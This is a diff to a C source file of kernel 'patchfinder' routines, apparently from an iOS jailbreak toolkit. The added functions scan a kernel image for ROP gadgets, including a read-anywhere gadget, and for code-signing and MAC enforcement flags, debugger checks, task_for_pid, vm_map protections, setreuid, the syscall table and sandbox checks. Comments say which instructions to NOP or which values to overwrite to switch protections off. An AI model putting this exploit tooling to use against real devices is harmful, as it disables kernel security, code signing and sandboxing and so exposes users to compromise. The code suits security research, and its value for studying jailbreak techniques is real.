@@ -662,6 +662,28 @@ uint32_t find_str_r1_r2_bx_lr(uint32_t region, uint8_t* kdata, size_t ksize)
     return ((uintptr_t)ptr) - ((uintptr_t)kdata);
 }
 
+// Helper gadget.
+uint32_t find_mov_r0_r1_bx_lr(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const uint8_t search[] = {0x08, 0x46, 0x70, 0x47};
+    void* ptr = memmem(kdata, ksize, search, sizeof(search)) + 1;
+    if(!ptr)
+        return 0;
+
+    return ((uintptr_t)ptr) - ((uintptr_t)kdata);
+}
+
+// Use for read-anywhere gadget.
+uint32_t find_ldr_r0_r1_bx_lr(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const uint8_t search[] = {0x08, 0x68, 0x70, 0x47};
+    void* ptr = memmem(kdata, ksize, search, sizeof(search)) + 1;
+    if(!ptr)
+        return 0;
+
+    return ((uintptr_t)ptr) - ((uintptr_t)kdata);
+}
+
 // Helper gadget for changing page tables / patching.
 uint32_t find_flush_dcache(uint32_t region, uint8_t* kdata, size_t ksize)
 {
@@ -783,6 +805,25 @@ uint32_t find_proc_enforce(uint32_t region, uint8_t* kdata, size_t ksize)
     return *proc_enforce_ptr - region;
 }
 
+// Write 0 here.
+uint32_t find_vnode_enforce(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    // Find the description.
+    uint8_t* vnode_enforce_description = memmem(kdata, ksize, "Enforce MAC policy on vnode operations", sizeof("Enforce MAC policy on vnode operations"));
+    if(!vnode_enforce_description)
+        return 0;
+
+    // Find what references the description.
+    uint32_t vnode_enforce_description_address = region + ((uintptr_t)vnode_enforce_description - (uintptr_t)kdata);
+    uint8_t* vnode_enforce_description_ptr = memmem(kdata, ksize, &vnode_enforce_description_address, sizeof(vnode_enforce_description_address));
+    if(!vnode_enforce_description_ptr)
+        return 0;
+
+    // Go up the struct to find the pointer to the actual data element.
+    uint32_t* vnode_enforce_ptr = (uint32_t*)(vnode_enforce_description_ptr - (5 * sizeof(uint32_t)));
+    return *vnode_enforce_ptr - region;
+}
+
 // Write 1 here.
 uint32_t find_cs_enforcement_disable_amfi(uint32_t region, uint8_t* kdata, size_t ksize)
 {
@@ -849,200 +890,201 @@ uint32_t find_cs_enforcement_disable_kernel(uint32_t region, uint8_t* kdata, siz
     return find_pc_rel_value(region, kdata, ksize, ldr_rn, insn_ldr_imm_rn(ldr_rn));
 }
 
-// Change this to non-zero.
-uint32_t find_i_can_has_debugger_1(uint32_t region, uint8_t* kdata, size_t ksize)
+uint16_t* find_PE_reboot_on_panic(uint32_t region, uint8_t* kdata, size_t ksize)
 {
     // Find function referencing i_can_has_debugger_1: PE_reboot_on_panic
     const struct find_search_mask search_masks[] =
     {
-        {0xFFF0, 0xF000}, // AND Rx, Ry, #4
-        {0xF0FF, 0x0004},
-        {0xFFFF, 0x2000}, // MOV R0, #0
-        {0xF8FF, 0x2800}, // CMP Rx, #0
-        {0xFFFF, 0xBF08}, // IT EQ
-        {0xFFFF, 0x2001}  // MOVEQ R0, #1
+        {0xFBF0, 0xF240},
+        {0x8F00, 0x0000},
+        {0xFBF0, 0xF2C0},
+        {0xFF00, 0x0000},
+        {0xFFFF, 0x4478},
+        {0xFFFF, 0xF8D0},
+        {0xF000, 0x0000},
+        {0xFD07, 0xB100},
+        {0xFBF0, 0xF240},
+        {0x8F00, 0x0000},
+        {0xFBF0, 0xF2C0},
+        {0xFF00, 0x0000},
+        {0xFFFF, 0x4478},
+        {0xFFFF, 0xF890},
+        {0xF000, 0x0000},
+        {0xFFFF, 0xF010},
+        {0xFFFF, 0x0F04},
+        {0xFF00, 0xBF00}
     };
 
     uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
     if(!insn)
         return 0;
 
-    // That AND masks i_can_has_debugger_2, but the CMP before that is on i_can_has_debugger_1. Find it.
-    uint16_t* cmp = find_last_insn_matching(region, kdata, ksize, insn, insn_is_cmp_imm);
-    if(!cmp)
+    return insn;
+}
+
+// Change this to non-zero.
+uint32_t find_i_can_has_debugger_1(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    // Find function referencing i_can_has_debugger_1: PE_reboot_on_panic
+    uint16_t* insn = find_PE_reboot_on_panic(region, kdata, ksize);
+    if(!insn)
         return 0;
 
-    int rn = insn_cmp_imm_rn(cmp);
+    insn += 10;
 
-    // Find the last LDR that loads the value the CMP uses.
-    uint16_t* ldr_rn = NULL;
-    uint16_t* ldr = cmp;
-    while(!ldr_rn)
-    {
-        ldr = find_last_insn_matching(region, kdata, ksize, ldr, insn_is_ldr_imm);
-        if(!ldr)
-            return 0;
+    uint32_t value = find_pc_rel_value(region, kdata, ksize, insn, insn_ldrb_imm_rt(insn));
+    if(!value)
+        return 0;
 
-        if(insn_ldr_imm_rt(ldr) == rn && insn_ldr_imm_imm(ldr) == 0)
-        {
-            ldr_rn = ldr;
-            break;
-        }
-    }
+    if ( (*insn & 0xFFF0) != 0xF8D0 )
+        return 0;
 
-    // Find the address that LDR is deferencing.
-    return find_pc_rel_value(region, kdata, ksize, ldr_rn, insn_ldr_imm_rn(ldr_rn));
+    return (insn[6] & 0xFFF) + value;
 }
 
 // Change this to what you want the value to be (non-zero appears to work).
 uint32_t find_i_can_has_debugger_2(uint32_t region, uint8_t* kdata, size_t ksize)
 {
     // Find function referencing i_can_has_debugger_1: PE_reboot_on_panic
-    const struct find_search_mask search_masks[] =
-    {
-        {0xFFF0, 0xF000}, // AND Rx, Ry, #4
-        {0xF0FF, 0x0004},
-        {0xFFFF, 0x2000}, // MOV R0, #0
-        {0xF8FF, 0x2800}, // CMP Rx, #0
-        {0xFFFF, 0xBF08}, // IT EQ
-        {0xFFFF, 0x2001}  // MOVEQ R0, #1
-    };
-
-    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+    uint16_t* insn = find_PE_reboot_on_panic(region, kdata, ksize);
     if(!insn)
         return 0;
 
-    // Make sure we have the right function.
-    if(!insn_is_and_imm(insn) || !insn_is_cmp_imm(insn + 3) || insn_and_imm_rd(insn) != insn_cmp_imm_rn(insn + 3) || insn_and_imm_imm(insn) != 4)
+    uint16_t* insn2 = insn + 13;
+
+    uint32_t value = find_pc_rel_value(region, kdata, ksize, insn2, insn_ldrb_imm_rt(insn2));
+    if(!value)
         return 0;
 
-    // That AND masks i_can_has_debugger_2. Find the last LDR that loads the value the AND uses.
-    int rn = insn_and_imm_rn(insn);
+    if ( (*insn2 & 0xFFF0) != 0xF890 )
+        return 0;
 
-    // Find the last LDR that loads the value the CMP uses. That load actually uses an address dereferenced from a pointer to i_can_has_debugger_2.
-    uint16_t* ldr_rn = NULL;
-    uint16_t* ldr = insn;
-    while(!ldr_rn)
+    return (insn[14] & 0xFFF) + value;
+}
+
+// Change TST.W instruction here with NOP, CMP R0, R0 (0x4280BF00)
+uint32_t find_vm_map_enter_patch(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks_84[] =
     {
-        ldr = find_last_insn_matching(region, kdata, ksize, ldr, insn_is_ldr_imm);
-        if(!ldr)
+        {0xFFF0, 0xF000}, // AND.W Rx, Ry, #2
+        {0xF0FF, 0x0002},
+        {0xFFF0, 0xF010}, // TST.W Rz, #2
+        {0xFFFF, 0x0F02},
+        {0xFF00, 0xD000}, // BEQ   loc_xxx
+        {0xF8FF, 0x2000}, // MOVS  Rk, #0
+        {0xFFF0, 0xF010}, // TST.W Rz, #4
+        {0xFFFF, 0x0F04}
+    };
+
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFBE0, 0xF000},
+        {0x8000, 0x0000},
+        {0xFFF0, 0xF010},
+        {0xFFFF, 0x0F02},
+        {0xFF00, 0xD000},
+        {0xF8FF, 0x2000},
+        {0xFFF0, 0xF010},
+        {0xFFFF, 0x0F04}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks_84) / sizeof(*search_masks_84), search_masks_84);
+    if(!insn)
+        insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+        if(!insn)
             return 0;
 
-        if(insn_ldr_imm_rt(ldr) == rn && insn_ldr_imm_imm(ldr) == 0)
-        {
-            ldr_rn = ldr;
-            break;
-        }
-    }
+    insn += 2;
 
-    // Find the last LDR that loads the value the last LDR used.
-    rn = insn_ldr_imm_rn(ldr_rn);
-    ldr = ldr_rn;
-    ldr_rn = NULL;
-    while(!ldr_rn)
+    return ((uintptr_t)insn) - ((uintptr_t)kdata);
+}
+
+// NOP out the BICNE.W instruction with 4 here.
+uint32_t find_vm_map_protect_patch(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks_84[] =
     {
-        ldr = find_last_insn_matching(region, kdata, ksize, ldr, insn_is_ldr_imm);
-        if(!ldr)
+        {0xFBF0, 0xF010}, // TST.W Rx, #0x20000000
+        {0x8F00, 0x0F00},
+        {0xFBFF, 0xF04F}, // MOV.W Rx, #0
+        {0x8000, 0x0000},
+        {0xFFF0, 0xBF00}, // IT EQ
+        {0xF8FF, 0x2001}, // MOVEQ Rx, #1
+        {0xFFC0, 0x6840}, // LDR             Rz, [Ry,#4]
+        {0xFFC0, 0x68C0}, // LDR             Rs, [Ry,#0xC]
+        {0xFFF0, 0xF000}, // AND.W           Ry, Rk, #6
+        {0xF0FF, 0x0006},
+        {0xF8FF, 0x2806}, // CMP             Ry, #6
+        {0xFBFF, 0xF04F}, // MOV.W           Ry, #0
+        {0x8000, 0x0000},
+        {0xFFF0, 0xBF00}, // IT EQ (?)
+        {0xF8FF, 0x2001}, // MOVEQ           Ry, #1
+        {0xFFC0, 0x4200}, // TST             Ry, Rx
+        {0xFFF0, 0xBF10}, // IT NE (?)
+        {0xFFF0, 0xF020}, // BICNE.W         Rk, Rk, #4
+        {0xF0FF, 0x0004}
+    };
+
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFBF0, 0xF010},
+        {0x8F00, 0x0F00},
+        {0xFBFF, 0xF04F},
+        {0x8000, 0x0000},
+        {0xFFF0, 0xF000},
+        {0xF0FF, 0x0006},
+        {0xFFF0, 0xBF00},
+        {0xF8FF, 0x2001},
+        {0xF8FF, 0x2806},
+        {0xFBFF, 0xF04F},
+        {0x8000, 0x0000},
+        {0xFFF0, 0xBF00},
+        {0xF8FF, 0x2001},
+        {0xFFC0, 0x4200},
+        {0xFFF0, 0xBF10},
+        {0xFFF0, 0xF020},
+        {0xF0FF, 0x0004}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks_84) / sizeof(*search_masks_84), search_masks_84);
+    if(!insn) {
+        
+        insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+        if(!insn)
             return 0;
+        else
+            insn += 15;
+    } else
+        insn += 17;
 
-        if(insn_ldr_imm_rt(ldr) == rn && insn_ldr_imm_imm(ldr) == 0)
-        {
-            ldr_rn = ldr;
-            break;
-        }
-    }
-
-    // Find the address that LDR is deferencing. This is p_i_can_has_debugger_2.
-    uint32_t p_i_can_has_debugger_2 = find_pc_rel_value(region, kdata, ksize, ldr_rn, insn_ldr_imm_rn(ldr_rn));
-
-    // Dereferencing that should find i_can_has_debugger_2
-    uint32_t i_can_has_debugger_2 = *(uint32_t*)(kdata + p_i_can_has_debugger_2);
-
-    // Get rid of the slide.
-    return i_can_has_debugger_2 - region;
+    return ((uintptr_t)insn) - ((uintptr_t)kdata);
 }
 
 // NOP out the conditional branch here.
-uint32_t find_vm_map_enter_patch(uint32_t region, uint8_t* kdata, size_t ksize)
-{
-    const struct find_search_mask search_masks[] =
-    {
-        {0xFFF0, 0xF000}, // AND Rx, Ry, #6
-        {0xF0FF, 0x0006},
-        {0xF8FF, 0x2806}  // CMP Rx, #6
-    };
-
-    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
-    if(!insn)
-        return 0;
-
-    insn += 3;
-
-    return ((uintptr_t)insn) - ((uintptr_t)kdata);
-}
-
-// Change the conditional branch here to an unconditional branch.
-uint32_t find_vm_map_protect_patch(uint32_t region, uint8_t* kdata, size_t ksize)
-{
-    const uint8_t search[] = {0x08, 0xBF, 0x10, 0xF0, 0x80, 0x4F};
-    uint16_t* insn = memmem(kdata, ksize, search, sizeof(search));
-    if(!insn)
-        return 0;
-
-    insn += 3;
-
-    return ((uintptr_t)insn) - ((uintptr_t)kdata);
-}
-
-// Change the conditional branch here to an unconditional branch.
 uint32_t find_tfp0_patch(uint32_t region, uint8_t* kdata, size_t ksize)
 {
-    // Find the task_for_pid function
-    const uint8_t search[] = {0x02, 0x46, 0x30, 0x46, 0x21, 0x46, 0x53, 0x46};
-    uint16_t* fn = memmem(kdata, ksize, search, sizeof(search));
-    if(!fn)
-        return 0;
+    // Find the beginning of task_for_pid function
+    const struct find_search_mask search_masks[] =
+    {
+        {0xF8FF, 0x9003},
+        {0xF8FF, 0x9002},
+        {0xF800, 0x2800},
+        {0xFBC0, 0xF000},
+        {0xD000, 0x8000},
+        {0xF800, 0xF000},
+        {0xF800, 0xF800},
+        {0xF8FF, 0x9003},
+        {0xF800, 0x2800},
+        {0xFBC0, 0xF000},
+        {0xD000, 0x8000}
+    };
+    uint16_t* fn_start = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
 
-    // Find the beginning of it
-    uint16_t* fn_start = find_last_insn_matching(region, kdata, ksize, fn, insn_is_preamble_push);
     if(!fn_start)
         return 0;
 
-    // Find where something is checked to be 0 (the PID check)
-    int found = 0;
-    uint16_t* current_instruction = fn_start;
-    while((uintptr_t)current_instruction < (uintptr_t)fn)
-    {
-        if(insn_is_cmp_imm(current_instruction) && insn_cmp_imm_imm(current_instruction) == 0)
-        {
-            found = 1;
-            break;
-        }
-
-        current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;
-    }
-
-    if(!found)
-        return 0;
-
-    // Find the next conditional branch
-    found = 0;
-    while((uintptr_t)current_instruction < (uintptr_t)fn)
-    {
-        // The unconditional branch is to detect an already patched function and still return the right address.
-        if(insn_is_b_conditional(current_instruction) || insn_is_b_unconditional(current_instruction))
-        {
-            found = 1;
-            break;
-        }
-
-        current_instruction += insn_is_32bit(current_instruction) ? 2 : 1;
-    }
-
-    if(!found)
-        return 0;
-
-    return ((uintptr_t)current_instruction) - ((uintptr_t)kdata);
+    return ((uintptr_t)fn_start) + 6 - ((uintptr_t)kdata);
 }
 
 // Write this with a jump to the sandbox hook, then write a trampoline back to just after the jump you wrote here. Sandbox hook should look at the path in *(r3 + 0x14) and force
@@ -1081,13 +1123,38 @@ uint32_t find_sb_patch(uint32_t region, uint8_t* kdata, size_t ksize)
 uint32_t find_vn_getpath(uint32_t region, uint8_t* kdata, size_t ksize)
 {
     // Find a string inside the vn_getpath function
-    const uint8_t search[] = {0x01, 0x20, 0xCD, 0xE9, 0x00, 0x01, 0x28, 0x46, 0x41, 0x46, 0x32, 0x46, 0x23, 0x46};
-    uint16_t* fn = memmem(kdata, ksize, search, sizeof(search));
-    if(!fn)
+    const struct  find_search_mask search_masks_84[] =
+    {
+        {0xF8FF, 0x2001},
+        {0xFFFF, 0xE9CD},
+        {0x0000, 0x0000},
+        {0xFF00, 0x4600},
+        {0xFF00, 0x4600},
+        {0xFF00, 0x4600},
+        {0xFF00, 0x4600}
+    };
+
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFF00, 0x4600},
+        {0xF8FF, 0x2001},
+        {0xFF00, 0x4600},
+        {0xFF00, 0x4600},
+        {0xFFFF, 0xE9CD},
+        {0x0000, 0x0000},
+        {0xFF00, 0x4600},
+        {0xFF00, 0x4600}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks_84) / sizeof(*search_masks_84), search_masks_84);
+    if(!insn)
+        insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+
+    if(!insn)
         return 0;
 
     // Find the start of the function
-    uint16_t* fn_start = find_last_insn_matching(region, kdata, ksize, fn, insn_is_preamble_push);
+    uint16_t* fn_start = find_last_insn_matching(region, kdata, ksize, insn, insn_is_preamble_push);
     if(!fn_start)
         return 0;
 
@@ -1098,17 +1165,28 @@ uint32_t find_vn_getpath(uint32_t region, uint8_t* kdata, size_t ksize)
 uint32_t find_memcmp(uint32_t region, uint8_t* kdata, size_t ksize)
 {
     // Okay, search is actually the entire text of memcmp. This is in order to distinguish it from bcmp. However, memcmp is the same as bcmp if you only care about equality.
-    const uint8_t search[] =
+    const struct find_search_mask search_masks[] =
     {
-        0x00, 0x23, 0x62, 0xB1, 0x91, 0xF8, 0x00, 0x90,
-        0x03, 0x78, 0x4B, 0x45, 0x09, 0xD1, 0x01, 0x3A,
-        0x00, 0xF1, 0x01, 0x00, 0x01, 0xF1, 0x01, 0x01,
-        0x4F, 0xF0, 0x00, 0x03, 0xF2, 0xD1, 0x18, 0x46,
-        0x70, 0x47, 0xA3, 0xEB, 0x09, 0x03, 0x18, 0x46,
-        0x70, 0x47
+        {0xFD00, 0xB100},
+        {0xFFF0, 0xF890},
+        {0x0000, 0x0000},
+        {0xF800, 0x7800},
+        {0xFF00, 0x4500},
+        {0xFF00, 0xBF00},
+        {0xFFF0, 0xEBA0},
+        {0x8030, 0x0000},
+        {0xFFFF, 0x4770},
+        {0xF8FF, 0x3801},
+        {0xFFF0, 0xF100},
+        {0xF0FF, 0x0001},
+        {0xFFF0, 0xF100},
+        {0xF0FF, 0x0001},
+        {0xFF00, 0xD100},
+        {0xF8FF, 0x2000},
+        {0xFFFF, 0x4770}
     };
 
-    void* ptr = memmem(kdata, ksize, search, sizeof(search)) + 1;
+    uint16_t* ptr = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
     if(!ptr)
         return 0;
 
@@ -1176,6 +1254,292 @@ uint32_t find_p_bootargs(uint32_t region, uint8_t* kdata, size_t ksize)
     return pe_state + 0x70;
 }
 
+// Function to find the syscall 0 function pointer. Used to modify the syscall table to call our own code.
+uint32_t Find_syscall0(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    uint8_t* str = memmem(kdata, ksize, ".HFS+ Private Directory Data\r", sizeof(".HFS+ Private Directory Data\r"));
+    if(str) {
+        uint32_t address = ((uintptr_t)str) + region - ((uintptr_t)kdata);
+        uint8_t *offset = memmem(kdata, ksize, (const char *)&address, sizeof(uint32_t));
+        // "HFS+" string offset preceded syscall table
+        return ((uintptr_t)offset) + 4 - ((uintptr_t)kdata);
+    }
+
+    return 0;
+}
+
+uint32_t find_mount(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFFF0, 0xF420},
+        {0xF0FF, 0x3080},
+        {0xFFF0, 0xF010},
+        {0xFFFF, 0x0F20},
+        {0xFFFF, 0xBF08},
+        {0xFFF0, 0xF440},
+        {0xF0FF, 0x3080},
+        {0xFFF0, 0xF010},
+        {0xFFFF, 0x0F01}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+    if(!insn)
+        return 0;
+
+    insn += 9;
+
+    return ((uintptr_t)insn) - ((uintptr_t)kdata);
+}
+
+uint32_t find_setreuid(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFFC0, 0x68C0},
+        {0xFF00, 0x4500},
+        {0xFF00, 0xD000},
+        {0xFF80, 0x6900},
+        {0xFF00, 0x4500},
+        {0xFFFF, 0xBF1C},
+        {0xFFC0, 0x6940},
+        {0xFF00, 0x4500},
+        {0xFF00, 0x0D00}
+    };
+
+    const struct find_search_mask search_masks_end[] =
+    {
+        {0xF8FF, 0x2800},
+        {0xFF00, 0xD000}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+    if(!insn)
+        return 0;
+
+    uint16_t* insn2 = insn;
+    insn2 += 8;
+
+    uint16_t* next = find_with_search_mask(region, (uint8_t*)insn2, ksize, sizeof(search_masks_end) / sizeof(*search_masks_end), search_masks_end);
+    if(!next)
+        return 0;
+    
+    insn += 2;
+
+    return ((uintptr_t)insn) - ((uintptr_t)kdata);
+}
+
+uint32_t find_setreuid_84(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFFC0, 0x4280},
+        {0xFF00, 0xD100},
+        {0xFF80, 0x4600},
+        {0xFFFF, 0xF06F},
+        {0xF0FF, 0x0064},
+        {0xF800, 0xE000},
+        {0x0000, 0x0000} // emmm... ;)
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+    if(!insn)
+        return 0;
+
+    return ((uintptr_t)insn) + 2 - ((uintptr_t)kdata);
+}
+
+// Function to copy strings to the kernel
+uint32_t find_copyinstr(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks[] =
+    {
+        {0x0FFF, 0x0F90},
+        {0xFFFF, 0xEE1D},
+        {0x0000, 0x0000},
+        {0xFFF0, 0xE590},
+        {0x0000, 0x0000},
+        {0xFFF0, 0xE580},
+        {0x0000, 0x0000},
+        {0xFFF0, 0xE590},
+        {0x0FFF, 0x0F10},
+        {0xFFFF, 0xEE02},
+        {0x0000, 0x0000},
+        {0xFFF0, 0xE590},
+        {0x0FFF, 0x0F30},
+        {0xFFFF, 0xEE0D}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+    if(!insn)
+        return 0;
+
+    // Find the beginning of the function
+    for ( ; (uint8_t*)insn > kdata; insn -= 2 )
+    {
+        if ( (insn[1] & 0xFFF0) == 0xE920 )
+            break;
+    }
+
+    return ((uintptr_t)insn) - ((uintptr_t)kdata);
+}
+
+uint32_t find_csops(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFC00, 0xF400},
+        {0x0000, 0x0000},
+        {0xF800, 0xE000},
+        {0x0000, 0x0000},
+        {0xFFF0, 0xF100},
+        {0x0000, 0x0000},
+        {0xFF80, 0x4600},
+        {0xF800, 0xF000},
+        {0x0000, 0x0000},
+        {0xFF80, 0x4600},
+        {0xFFF0, 0xF890},
+        {0x0000, 0x0000},
+        {0xFFF0, 0xF010},
+        {0xFFFF, 0x0F01},
+        {0xFC00, 0xF000},
+        {0x0000, 0x0000}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+    if(!insn)
+        return 0;
+
+    insn += 14;
+
+    return ((uintptr_t)insn) - ((uintptr_t)kdata);
+}
+
+// Set 0x20 here. Replace
+uint32_t find_csops2(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks[] =
+    {
+        {0xF800, 0x9800},
+        {0xFBF0, 0xF100},
+        {0x8000, 0x0000},
+        {0xFFC0, 0x4600},
+        {0xF800, 0xF000},
+        {0xF800, 0xE800},
+        {0xFFF0, 0xF8D0},
+        {0x0000, 0x0000},
+        {0xFAF0, 0xF040}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+    if(!insn)
+        return 0;
+
+    insn += 8;
+
+    return ((uintptr_t)insn) - ((uintptr_t)kdata);
+}
+
+// dunno
+uint32_t find_mem_func(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks_84[] =
+    {
+        {0xFFC0, 0x6980},
+        {0xFFF0, 0xF000},
+        {0xF0FF, 0x0040},
+        {0xFBF0, 0xF010},
+        {0x8F00, 0x0F00},
+        {0xFFF0, 0xF8D0},
+        {0x0FFF, 0x0014},
+        {0xFFF0, 0xF8D0},
+        {0xFFFF, 0xE010},
+        {0xFF00, 0xD100}
+    };
+
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFFC0, 0x6980},
+        {0xFFF0, 0xF8D0},
+        {0x0FFF, 0x0014},
+        {0xFFF0, 0xF8D0},
+        {0xFFFF, 0xE010},
+        {0xFFF0, 0xF000},
+        {0xF0FF, 0x0040},
+        {0xFBF0, 0xF010},
+        {0x8F00, 0x0F00},
+        {0xFF00, 0xD100}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks_84) / sizeof(*search_masks_84), search_masks_84);
+    if(!insn)
+        insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+        if(!insn)
+            return 0;
+
+    return ((uintptr_t)insn) - ((uintptr_t)kdata);
+}
+
+// NOP out the conditional branch here (prevent kIOReturnLockedWrite error).
+uint32_t find_mapForIO(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    // checked on iPhone5,2 8.2 and iPhone5,1 8.4
+    const struct find_search_mask search_masks_84[] =
+    {
+        {0xFFF0, 0xF8D0},
+        {0x0000, 0x0000},
+        {0xFFF0, 0xF890},
+        {0x0000, 0x0000},
+        {0xFF00, 0x4800},
+        {0xFFFF, 0x2900},
+        {0xFBC0, 0xF040},
+        {0xD000, 0x8000}
+    };
+
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFFF0, 0xF8D0},
+        {0x0000, 0x0000},
+        {0xFF00, 0x4800},
+        {0xFFF0, 0xF890},
+        {0x0000, 0x0000},
+        {0xFFFF, 0x2900},
+        {0xFBC0, 0xF040},
+        {0xD000, 0x8000}
+    };
+
+    uint16_t* insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks_84) / sizeof(*search_masks_84), search_masks_84);
+    if(!insn)
+        insn = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+        if(!insn)
+            return 0;
+
+    insn += 12;
+
+    return ((uintptr_t)insn) - ((uintptr_t)kdata);
+}
+
+// NOP out the BL call here.
+uint32_t find_sandbox_call_i_can_has_debugger(uint32_t region, uint8_t* kdata, size_t ksize)
+{
+    const struct find_search_mask search_masks[] =
+    {
+        {0xFFFF, 0xB590}, // PUSH {R4,R7,LR}
+        {0xFFFF, 0x2000}, // MOVS R0, #0
+        {0xFFFF, 0xAF01}, // ADD  R7, SP, #4
+        {0xFFFF, 0x2400}, // MOVS R4, #0
+        {0xF800, 0xF000}, // BL   i_can_has_debugger
+        {0xD000, 0xD000},
+        {0xFD07, 0xB100}  // CBZ  R0, loc_xxx
+    };
+
+    uint16_t* ptr = find_with_search_mask(region, kdata, ksize, sizeof(search_masks) / sizeof(*search_masks), search_masks);
+    if(!ptr)
+        return 0;
+
+    return (uintptr_t)ptr + 8 - ((uintptr_t)kdata);
+}
+
 // This gets the zone_page_table array in osfmk/kern/zalloc.c. Useful for diagnosing problems with the zone allocator.
 uint32_t find_zone_page_table(uint32_t region, uint8_t* kdata, size_t ksize)
 {
@@ -1224,26 +1588,6 @@ uint32_t find_ipc_kmsg_destroy(uint32_t region, uint8_t* kdata, size_t ksize)
 
     uint16_t* fn_start = find_last_insn_matching(region, kdata, ksize, (uint16_t*)ptr, insn_is_preamble_push);
     return ((uintptr_t)fn_start - (uintptr_t)kdata) | 1;
-}
-
-// Function to find the syscall 0 function pointer. Used to modify the syscall table to call our own code.
-uint32_t find_syscall0(uint32_t region, uint8_t* kdata, size_t ksize)
-{
-    // Search for the preamble to syscall 1
-    const uint8_t syscall1_search[] = {0x90, 0xB5, 0x01, 0xAF, 0x82, 0xB0, 0x09, 0x68, 0x01, 0x24, 0x00, 0x23};
-    void* ptr = memmem(kdata, ksize, syscall1_search, sizeof(syscall1_search));
-    if(!ptr)
-        return 0;
-
-    // Search for a pointer to syscall 1
-    uint32_t ptr_address = (uintptr_t)ptr - (uintptr_t)kdata + region;
-    uint32_t function = ptr_address | 1;
-    void* syscall1_entry = memmem(kdata, ksize, &function, sizeof(function));
-    if(!syscall1_entry)
-        return 0;
-
-    // Calculate the address of syscall 0 from the address of the syscall 1 entry
-    return (uintptr_t)syscall1_entry - (uintptr_t)kdata - 0x18;
 }
 
 // Function used to free any dead ports we find to clean up after memory leak.
